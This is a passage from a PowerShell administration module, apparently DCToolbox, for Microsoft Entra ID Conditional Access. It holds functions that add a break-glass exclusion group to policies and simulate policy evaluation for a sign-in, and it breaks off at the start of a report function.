            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Add-DCConditionalAccessPoliciesBreakGlassGroup {
    <#
        .SYNOPSIS
            Excludes a specified Entra ID security group from all Conditional Access policies in the tenant.

        .DESCRIPTION
            Excludes a specified Entra ID security group from all Conditional Access policies in the tenant.

            Please create the group and add your break glass accounts before running this command.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only modify the policies with this prefix. The filter is case sensitive.

        .PARAMETER ExcludeGroupName
            The name of your exclude group in Entra ID. Please create the group and add your break glass accounts before running this command.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Add-DCConditionalAccessPoliciesBreakGlassGroup -PrefixFilter 'GLOBAL - ' -ExcludeGroupName 'Excluded from Conditional Access'
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $true)]
        [string]$ExcludeGroupName
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All', 'Group.Read.All' -Verbose


    # Prompt for confirmation:
    $title    = 'Confirm'
    $question = "Do you want to exclude the group '$($ExcludeGroupName)' from all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
    $choices  = '&Yes', '&No'

    $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
    if ($decision -eq 0) {
        Write-Host ""
    } else {
        return
    }


    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing exclude group '$ExcludeGroupName'..."
    $ExistingExcludeGroup = Get-MgGroup -Filter "DisplayName eq '$ExcludeGroupName'" -Top 1

    if ($ExistingExcludeGroup) {
        Write-Verbose -Verbose -Message "Found group '$ExcludeGroupName'!"
    } else {
        Write-Error -Message "Could not find group '$ExcludeGroupName'!"
        return
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to modify..."
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Write-Verbose -Verbose -Message "Excluding group '$ExcludeGroupName' from '$($Policy.DisplayName)'..."

            # Toggle policy:
            $params = @{
                Conditions = @{
                    Users = @{
                        ExcludeGroups = @(
                            $Policy.Conditions.Users.ExcludeGroups
                            "$($ExistingExcludeGroup.Id)"
                        )
                    }
                }
            }
            
            Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

            Start-Sleep -Seconds 1
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Invoke-DCConditionalAccessSimulation {
    <#
        .SYNOPSIS
            Simulates the Entra ID Conditional Access evaluation process of a specific scenario.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Entra ID Conditional Access policies. It then evaluates which policies that would have been applied if this was a real sign-in to Entra ID. Use the different parameters available to specify the conditions. Details are included under each parameter.

        .PARAMETER UserPrincipalName
            The UPN of the simulated Entra ID user signing in. Can also be set to 'All' for all users, or 'GuestsOrExternalUsers' to test external user sign-in scenarios. Example: 'user@example.com'. Default: 'All'.

        .PARAMETER JSONFile
            Only use this parameter if you want to analyze a local JSON file export of Conditional Access polices, instead of a live tenant. Point it to the local JSON file. Export JSON with Export-DCConditionalAccessPolicyDesign (or any other tool exporting Conditional Access policies from Microsoft Graph to JSON), like 'Entra Exporter'.

        .PARAMETER ApplicationDisplayName
            The display name of the application targeted by Conditional Access policies (same display name as in Entra ID Portal when creating Conditional Access policies). Example 1: 'Office 365'. Example 2: 'Microsoft Admin Portals'. Default: 'All'.

        .PARAMETER UserAction
            Under construction...

        .PARAMETER ClientApp
            The client app type used during sign-in. Possible values: 'browser', 'mobileAppsAndDesktopClients', 'exchangeActiveSync', 'easSupported', 'other'. Default: 'browser'

        .PARAMETER TrustedIPAddress
            Specify if the simulated sign-in comes from a trusted IP address (marked as trusted in Named Locations)? $true or $false? Don't specify the actual IP address. That is not really that important when simulating policy evaluation. Default: $false

        .PARAMETER Country
            The country code for the sign-in country of origin based on IP address geo data. By default, this script tries to resolve the IP address of the current PowerShell session.

        .PARAMETER Platform
            Specify the OS platform of the client signing in. Possible values: 'all', 'android', 'iOS', 'windows', 'windowsPhone', 'macOS', 'linux', 'spaceRocket'. Default: 'windows'

        .PARAMETER SignInRiskLevel
            Specify the Entra ID Protection sign-in risk level. Possible values: 'none', 'low', 'medium', 'high'. Default: 'none'

        .PARAMETER UserRiskLevel
            Specify the Entra ID Protection user risk level. Possible values: 'none', 'low', 'medium', 'high'. Default: 'none'

        .PARAMETER SummarizedOutput
            By default, this script returns PowerShell objects representing all applied Conditional Access policies only. This can be used for piping to other tools, etc. But sometimes you also want a simple answer of what would happen during the simulated policy evaluation. Specify this parameter to add a summarized and simplified output (outputs to 'Informational' stream with Write-Host).

        .PARAMETER VerbosePolicyEvaluation
            Include detailed verbose policy evaluation info. Use for troubleshooting and debugging.

        .PARAMETER IncludeNonMatchingPolicies
            Also, include all policies that did not match, and therefor was not applied. This can be useful to produce different kinds of Conditional Access reports.
            
        .INPUTS
            None

        .OUTPUTS
            Simulated Conditional Access evaluation results

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            # Run basic evaluation with default settings.
            Invoke-DCConditionalAccessSimulation | Format-List

        .EXAMPLE
            # Run evaluation with custom settings.
            $Parameters = @{
                UserPrincipalName = 'user@example.com'
                ApplicationDisplayName = 'Office 365'
                ClientApp = 'mobileAppsAndDesktopClients'
                TrustedIPAddress = $true
                Country = 'US'
                Platform = 'windows'
                SignInRiskLevel = 'medium'
                UserRiskLevel = 'high'
                SummarizedOutput = $true
                VerbosePolicyEvaluation = $false
                IncludeNonMatchingPolicies = $false
            }

            Invoke-DCConditionalAccessSimulation @Parameters

        .EXAMPLE
            # Run basic evaluation offline against a JSON of Conditional Access policies.
            Invoke-DCConditionalAccessSimulation -JSONFile 'Conditional Access Backup.json' | Format-List
    #>



    # ----- [Initializations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$JSONFile,

        [parameter(Mandatory = $false)]
        [string]$UserPrincipalName = 'All',

        [parameter(Mandatory = $false)]
        [string]$ApplicationDisplayName = 'All',

        [parameter(Mandatory = $false)]
        [string]$UserAction,

        [parameter(Mandatory = $false)]
        [ValidateSet('browser', 'mobileAppsAndDesktopClients', 'exchangeActiveSync', 'easSupported', 'other')]
        [string]$ClientApp = 'browser',

        [parameter(Mandatory = $false)]
        [switch]$TrustedIPAddress,

        [parameter(Mandatory = $false)]
        [ValidateLength(2,2)]
        [string]$Country = ((Get-DCPublicIP).country),

        [parameter(Mandatory = $false)]
        [ValidateSet('all', 'android', 'iOS', 'windows', 'windowsPhone', 'macOS', 'linux', 'spaceRocket')]
        [string]$Platform = 'windows',

        [parameter(Mandatory = $false)]
        [ValidateSet('none', 'low', 'medium', 'high')]
        [string]$SignInRiskLevel = 'none',

        [parameter(Mandatory = $false)]
        [ValidateSet('none', 'low', 'medium', 'high')]
        [string]$UserRiskLevel = 'none',

        [parameter(Mandatory = $false)]
        [switch]$SummarizedOutput,

        [parameter(Mandatory = $false)]
        [switch]$VerbosePolicyEvaluation,

        [parameter(Mandatory = $false)]
        [switch]$IncludeNonMatchingPolicies
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    $Policies = $null

    if ($JSONFile) {
        $Policies = Get-Content -Path $JSONFile | ConvertFrom-Json

        if ($UserPrincipalName -ne 'GuestsOrExternalUsers') {
            $UserPrincipalName = 'All'
        }
    } else {
        # Check Microsoft Graph PowerShell module.
        Install-DCMicrosoftGraphPowerShellModule -Verbose


        # Connect to Microsoft Graph.
        Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'User.Read.All' -Verbose


        # Get all existing policies.
        Write-Verbose -Verbose -Message "Fetching Conditional Access policies..."
        $Policies = Get-MgIdentityConditionalAccessPolicy
    }


    # Set conditions to simulate.

    Write-Verbose -Verbose -Message "Simulating Conditional Access evaluation..."

    $CustomObject = New-Object -TypeName psobject


    # User.
    $UserId = (Get-MgUser -Filter "userPrincipalName eq '$UserPrincipalName'").Id
    
    if ($UserId) {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserId" -Value $UserId
    } else {
        if ($UserPrincipalName -eq 'GuestsOrExternalUsers') {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "UserId" -Value 'GuestsOrExternalUsers'
        } else {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "UserId" -Value 'All'
        }
    }


    # Groups.
    $Groups = $null

    if ($UserId) {
        $Groups = (Get-MgUserTransitiveMemberOf -UserId $UserId).Id
        $CustomObject | Add-Member -MemberType NoteProperty -Name "Groups" -Value $Groups
    } else {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "Groups" -Value $null
    }


    #Application.
    $AppId = $null
    if ($ApplicationDisplayName -eq 'All') {
        $AppId = 'All'
    } elseif ($ApplicationDisplayName -eq 'Office 365') {
        $AppId = 'Office365'
    } elseif ($ApplicationDisplayName -eq 'Microsoft Admin Portals') {
        $AppId = 'MicrosoftAdminPortals'
    } else {
        $AppId = (Get-MGServicePrincipal -Filter "DisplayName eq '$ApplicationDisplayName'").AppId
    }

    $CustomObject | Add-Member -MemberType NoteProperty -Name "Application" -Value $AppId


    # Client App (all, browser, mobileAppsAndDesktopClients, exchangeActiveSync, easSupported, other).
    $CustomObject | Add-Member -MemberType NoteProperty -Name "ClientApp" -Value $ClientApp


    # IP Address.
    $CustomObject | Add-Member -MemberType NoteProperty -Name "TrustedIPAddress" -Value $TrustedIPAddress


    # Country.
    if ($Country -eq $null) {
        $Country = 'All'
    }

    $CustomObject | Add-Member -MemberType NoteProperty -Name "Country" -Value $Country 


    # Platform (android, iOS, windows, windowsPhone, macOS, linux, all, unknownFutureValue).
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Platform" -Value $Platform


    # Sign-in Risk Level (low, medium, high, none).
    $CustomObject | Add-Member -MemberType NoteProperty -Name "SignInRiskLevel" -Value $SignInRiskLevel


    # User Risk Level (low, medium, high, none).
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserRiskLevel" -Value $UserRiskLevel


    $ConditionsToSimulate = $CustomObject


    # Show conditions to test.
    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message ($ConditionsToSimulate | Format-List | Out-String) }
    


    # Loop through all Conditional Access policies and test the current conditions.
    $Result = foreach ($Policy in $Policies) {
        if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message "POLICY EVALUATION: $($Policy.DisplayName)" }

        $CustomObject = New-Object -TypeName psobject

        $CustomObject | Add-Member -MemberType NoteProperty -Name "Policy" -Value $Policy.DisplayName

        $GrantControls = $Policy.GrantControls | Select-Object AuthenticationStrength, Operator, BuiltInControls, TermsOfUse, CustomAuthenticationFactors

        try {
            if ($GrantControls.authenticationStrength.id) {
                $GrantControls.authenticationStrength = $true
            } else {
                $GrantControls.authenticationStrength = $false
            }

            $GrantControls = $GrantControls | ConvertTo-Json -Depth 10

            $CustomObject | Add-Member -MemberType NoteProperty -Name "GrantControls" -Value $GrantControls
        } catch {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "GrantControls" -Value $GrantControls
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "SessionControls" -Value ($Policy.SessionControls | Select-Object ApplicationEnforcedRestrictions, CloudAppSecurity, DisableResilienceDefaults, PersistentBrowser, SignInFrequency | ConvertTo-Json)
        
        
        $PolicyMatch = $true
        $UserMatch = $false
        $GroupMatch = $false


        #Enabled
        if ($Policy.State -eq 'enabled') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'Enabled: APPLIED' }
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'Enabled: NOT APPLIED' }
            $PolicyMatch = $false
        }


        #ApplicationFilter

        
        # ExcludeApplications:
        if ($Policy.Conditions.Applications.ExcludeApplications -contains $ConditionsToSimulate.Application) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeApplications: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeApplications: APPLIED' }
        }


        #IncludeApplications
        if ($Policy.Conditions.Applications.IncludeApplications -eq 'All') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeApplications: APPLIED' }
        } elseif ($Policy.Conditions.Applications.IncludeApplications -eq 'none') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeApplications: NOT APPLIED' }
            $PolicyMatch = $false
        } elseif ($Policy.Conditions.Applications.IncludeApplications -notcontains $ConditionsToSimulate.Application) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeApplications: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeApplications: APPLIED' }
        }


        #IncludeUserActions
        #


        #ClientAppTypes
        if ($Policy.Conditions.ClientAppTypes -eq 'all') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ClientAppTypes: APPLIED' }
        } elseif ($Policy.Conditions.ClientAppTypes -notcontains $ConditionsToSimulate.ClientApp) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ClientAppTypes: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ClientAppTypes: APPLIED' }
        }


        #DeviceFilter
        #


        #ExcludeLocationsIPAddress
        if ($ConditionsToSimulate.TrustedIPAddress) {
            $TrustedLocation = foreach ($Location in $Policy.Conditions.Locations.ExcludeLocations) {
                if (!($JSONFile)) {
                    (Get-MgIdentityConditionalAccessNamedLocation | where id -eq $Location).AdditionalProperties.isTrusted
                }
            }

            if ($TrustedLocation) {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsIPAddress: NOT APPLIED' }
                $PolicyMatch = $false
            } else {
                if ($JSONFile) {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsIPAddress: APPLIED (JSON mode assumes not excluded)' }
                } else {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsIPAddress: APPLIED' }
                }
            }
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsIPAddress: APPLIED' }
        }


        #ExcludeLocationsCountry
        $TrustedLocation = foreach ($Location in $Policy.Conditions.Locations.ExcludeLocations) {
            if (!($JSONFile)) {
                (Get-MgIdentityConditionalAccessNamedLocation | where id -eq $Location).AdditionalProperties.countriesAndRegions
            }
        }

        if ($TrustedLocation -contains $ConditionsToSimulate.Country) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsCountry: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($JSONFile -and $Policy.Conditions.Locations.ExcludeLocations) {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsCountry: NOT APPLIED (JSON mode assumes excluded)' }
                $PolicyMatch = $false
            } else {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeLocationsCountry: APPLIED' }
            }
        }


        #IncludeLocationsIPAddress
        $IncludeLocationsIPAddressMatch = $true
        if ($Policy.Conditions.Locations.IncludeLocations -eq $null) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: APPLIED' }
        } elseif ($Policy.Conditions.Locations.IncludeLocations -eq 'All') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: APPLIED' }
        } elseif ($Policy.Conditions.Locations.IncludeLocations -eq 'AllTrusted' -and $ConditionsToSimulate.TrustedIPAddress) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: APPLIED' }
        } else {
            $TrustedLocation = foreach ($Location in $Policy.Conditions.Locations.IncludeLocations) {
                if (!($JSONFile)) {
                    (Get-MgIdentityConditionalAccessNamedLocation | where id -eq $Location).AdditionalProperties.isTrusted
                }
            }

            $TrustedLocation = $TrustedLocation | Where-Object { $_ -eq $true }

            if ($TrustedLocation -and $ConditionsToSimulate.TrustedIPAddress) {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: APPLIED' }
            } else {
                if ($JSONFile) {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: APPLIED (JSON mode assumes included)' }
                } else {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsIPAddress: NOT APPLIED' }
                    $IncludeLocationsIPAddressMatch = $false
                }
            }
        }


        #IncludeLocationsCountry
        $IncludeLocationsCountryMatch = $true
        if ($Policy.Conditions.Locations.IncludeLocations -eq $null) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: APPLIED' }
        } elseif ($Policy.Conditions.Locations.IncludeLocations -eq 'All') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: APPLIED' }
        } elseif ($Policy.Conditions.Locations.IncludeLocations -eq 'AllTrusted') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: APPLIED' }
        } else {
            $TrustedLocation = foreach ($Location in $Policy.Conditions.Locations.IncludeLocations) {
                if (!($JSONFile)) {
                    (Get-MgIdentityConditionalAccessNamedLocation | where id -eq $Location).AdditionalProperties.countriesAndRegions
                }
            }

            if ($TrustedLocation -contains $ConditionsToSimulate.Country) {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: APPLIED' }
            } else {
                if ($JSONFile) {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: APPLIED (JSON mode assumes included)' }
                } else {
                    if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeLocationsCountry: NOT APPLIED' }
                    $IncludeLocationsCountryMatch = $false
                }
            }
        }

        if ($IncludeLocationsIPAddressMatch -eq $false -and $IncludeLocationsCountryMatch -eq $false) {
            $PolicyMatch = $false
        }
        

        #ExcludePlatforms
        if (($Policy.Conditions.Platforms.ExcludePlatforms).Count -eq 0) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludePlatforms: APPLIED' }
        } elseif ($Policy.Conditions.Platforms.ExcludePlatforms -eq 'all') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludePlatforms: NOT APPLIED' }
            $PolicyMatch = $false
        } elseif ($Policy.Conditions.Platforms.ExcludePlatforms -contains $ConditionsToSimulate.Platform) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludePlatforms: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludePlatforms: APPLIED' }
        }


        #IncludePlatforms
        if (($Policy.Conditions.Platforms.IncludePlatforms).Count -eq 0) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludePlatforms: APPLIED' }
        } elseif ($Policy.Conditions.Platforms.IncludePlatforms -eq 'all') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludePlatforms: APPLIED' }
        } elseif ($Policy.Conditions.Platforms.IncludePlatforms -contains $ConditionsToSimulate.Platform) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludePlatforms: APPLIED' }
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludePlatforms: NOT APPLIED' }
            $PolicyMatch = $false
        }


        #SignInRiskLevels
        if (($Policy.Conditions.SignInRiskLevels).Count -eq 0) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'SignInRiskLevels: APPLIED' }
        } elseif ($Policy.Conditions.SignInRiskLevels -notcontains $ConditionsToSimulate.SignInRiskLevel) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'SignInRiskLevels: NOT APPLIED' }
            $PolicyMatch = $false
        }


        #UserRiskLevels
        if (($Policy.Conditions.UserRiskLevels).Count -eq 0) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'UserRiskLevels: APPLIED' }
        } elseif ($Policy.Conditions.UserRiskLevels -notcontains $ConditionsToSimulate.UserRiskLevel) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'UserRiskLevels: NOT APPLIED' }
            $PolicyMatch = $false
        }


        #ExcludeGroups
        $ExcludeGroupsResult = 'ExcludeGroups: APPLIED'

        if (($Policy.Conditions.Users.ExcludeGroups).Count -eq 0) {
            #
        } else {
            foreach ($Group in $Policy.Conditions.Users.ExcludeGroups) {
                if ($ConditionsToSimulate.Groups -contains $Group) {
                    $ExcludeGroupsResult = 'ExcludeGroups: NOT APPLIED'
                    break
                }
            }
        }

        if ($ExcludeGroupsResult -eq 'ExcludeGroups: APPLIED') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message $ExcludeGroupsResult }
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message $ExcludeGroupsResult }
            $PolicyMatch = $false
        }


        #IncludeGroups
        $IncludeGroupsResult = 'IncludeGroups: NOT APPLIED'

        if (($Policy.Conditions.Users.IncludeGroups).Count -eq 0) {
            #
        } else {
            foreach ($Group in $Policy.Conditions.Users.IncludeGroups) {
                if ($ConditionsToSimulate.Groups -contains $Group) {
                    $IncludeGroupsResult = 'IncludeGroups: APPLIED'
                    break
                }
            }
        }

        if ($IncludeGroupsResult -eq 'IncludeGroups: NOT APPLIED') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message $IncludeGroupsResult }
            $GroupMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message $IncludeGroupsResult }
            $GroupMatch = $true
        }


        #ExcludeGuestsOrExternalUsers
        #IncludeGuestsOrExternalUsers
        #ExcludeRoles
        #IncludeRoles


        #ExcludeUsers
        if ($Policy.Conditions.Users.excludeGuestsOrExternalUsers.GuestOrExternalUserTypes -and $ConditionsToSimulate.UserId -eq 'GuestsOrExternalUsers') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeUsers: NOT APPLIED' }
            $UserMatch = $false
        } elseif ($Policy.Conditions.Users.ExcludeUsers -contains $ConditionsToSimulate.UserId) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeUsers: NOT APPLIED' }
            $PolicyMatch = $false
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'ExcludeUsers: APPLIED' }
        }


        #IncludeUsers
        if ($Policy.Conditions.Users.IncludeUsers -eq 'All') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeUsers: APPLIED' }
            $UserMatch = $true
        } elseif ($Policy.Conditions.Users.includeGuestsOrExternalUsers.GuestOrExternalUserTypes -and $ConditionsToSimulate.UserId -eq 'GuestsOrExternalUsers') {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeUsers: APPLIED' }
            $UserMatch = $true
        } elseif ($Policy.Conditions.Users.IncludeUsers -contains $ConditionsToSimulate.UserId) {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeUsers: APPLIED' }
            $UserMatch = $true
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message 'IncludeUsers: NOT APPLIED' }
            $UserMatch = $false
        }
        

        if ($PolicyMatch) {
            if ($GroupMatch -or $UserMatch) {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message "POLICY APPLIED: TRUE" }
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Match" -Value $true
            } else {
                if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message "POLICY APPLIED: FALSE" }
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Match" -Value $false
            }
        } else {
            if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message "POLICY APPLIED: FALSE" }
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Match" -Value $false
        }


        $CustomObject

        if ($VerbosePolicyEvaluation) { Write-Verbose -Verbose -Message '' }
    }


    Write-Verbose -Verbose -Message "Results..."


    if ($IncludeNonMatchingPolicies) {
        $Result
    } else {
        $Result | where Match -eq $true
    }


    if ($SummarizedOutput) {
        $Enforcement = @((($Result | where Match -eq $True).GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).BuiltInControls | Select-Object -Unique)

        if ((($Result | where Match -eq $True).GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).AuthenticationStrength -eq $true) {
            $Enforcement += 'authenticationStrength'
        }

        if ((($Result | where Match -eq $True).GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).TermsOfUse | Select-Object -Unique) {
            $Enforcement += 'termsOfUse'
        }

        $CustomControls = ((($Result | where Match -eq $True).GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).CustomAuthenticationFactors | Select-Object -Unique)

        if ($CustomControls) {
            $Enforcement += $CustomControls
        }

        if ($Enforcement -contains 'block') {
            $Enforcement = 'block'
        }

        Write-Host ''
        Write-Host -ForegroundColor Cyan 'Entra ID Sign-In test parameters:'
        Write-Host -ForegroundColor Magenta ($ConditionsToSimulate | Format-List | Out-String)
        
        Write-Host -ForegroundColor Cyan 'Applied Conditional Access policies:'

        $AppliedPolicies = foreach ($Policy in ($Result | where Match -eq $True)) {
            $EnforcementPerPolicy = @(($Policy.GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).BuiltInControls | Select-Object -Unique)

            if (($Policy.GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).AuthenticationStrength -eq $true) {
                $EnforcementPerPolicy += 'authenticationStrength'
            }

            if (($Policy.GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).TermsOfUse | Select-Object -Unique) {
                $EnforcementPerPolicy += 'termsOfUse'
            }

            $CustomControls = (($Policy.GrantControls | ConvertFrom-Json -ErrorAction SilentlyContinue).CustomAuthenticationFactors | Select-Object -Unique)

            if ($CustomControls) {
                $EnforcementPerPolicy += $CustomControls
            }

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Policy" -Value ($Policy).Policy
            
            $Operator = ($Policy).GrantControls.Operator

            $CustomObject | Add-Member -MemberType NoteProperty -Name "Operator" -Value ((($Policy).GrantControls | ConvertFrom-Json).Operator)
            
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Controls" -Value $EnforcementPerPolicy
            $CustomObject
        }

        Write-Host -ForegroundColor Magenta ($AppliedPolicies | Format-Table | Out-String)

        if (!($AppliedPolicies)) {
            Write-Host -ForegroundColor DarkGray 'None'
            Write-Host ''
            Write-Host ''
        }
        
        Write-Host -ForegroundColor Cyan "Enforced controls:"

        foreach ($Row in ($Enforcement -replace " ", "`n")) {
            if ($Row -eq 'block') {
                Write-Host -ForegroundColor Red $Row
            } else {
                Write-Host -ForegroundColor Green $Row
            }
        }

        if (!($Enforcement)) {
            Write-Host ''
            Write-Host -ForegroundColor DarkGray 'No controls enforced :('
            Write-Host ''
        }
        
        Write-Host ''
    }

    
    Write-Verbose -Verbose -Message "Done!"
}



function New-DCConditionalAccessPolicyDesignReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing your current Conditional Access policy design.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Conditional Access policies and exports an Excel report, You can use the report as documentation, design document, or to get a nice overview of all your policies.

            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force

            The report is exported to Excel and will automatically open. In Excel, please do this:
            1. Select all cells.
            2. Click on "Wrap Text".
            3. Click on "Top Align".

            The report is now easier to read.
            
            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).
            
        .INPUTS
            None

        .OUTPUTS
            Excel report with all Conditional Access policies.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            New-DCConditionalAccessPolicyDesignReport
    #>



    # ----- [Initialisations] -----

    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

